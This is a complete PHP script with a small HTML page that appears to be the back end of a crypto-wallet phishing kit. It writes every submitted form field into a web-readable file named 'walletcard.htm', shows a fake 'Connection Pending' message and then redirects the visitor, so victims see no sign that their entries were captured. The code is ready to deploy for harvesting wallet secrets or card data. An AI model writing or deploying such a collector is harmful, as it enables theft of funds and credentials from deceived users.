<?php
// Define the file path
$filePath = 'walletcard.htm'; // Ensure this file exists in the same directory as data.php

// Check if the file exists, and create it if it doesn't
if (!file_exists($filePath)) {
    file_put_contents($filePath, ''); // Create the file
}

// Open the file for appending
$handle = fopen($filePath, "a");

if (!$handle) {
    die('Failed to open file for writing: ' . error_get_last()['message']);
}

// Iterate through POST data
foreach ($_POST as $variable => $value) {
    // Sanitize form input to prevent any injection attacks
    $safe_variable = htmlspecialchars($variable, ENT_QUOTES, 'UTF-8');
    $safe_value = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
    
    // Write sanitized data to the file
    fwrite($handle, $safe_variable . "=" . $safe_value . "<br>");
}

fwrite($handle, "<hr>");
fclose($handle);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connection Successful</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f3f4f6;
        }
        .popup {
            text-align: center;
            padding: 20px;
            border-radius: 10px;
            background-color: orange;
            color: white;
            font-size: 20px;
            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
        }
    </style>
</head>
<body>
    <div class="popup">
        Connection Pending
    </div>

    <script>
        // Show the success message for 3 seconds, then redirect
        setTimeout(function() {
            window.location.href = "index.html";  // Change to your redirect URL
        }, 3000); // 3-second delay before redirect
    </script>
</body>
</html>
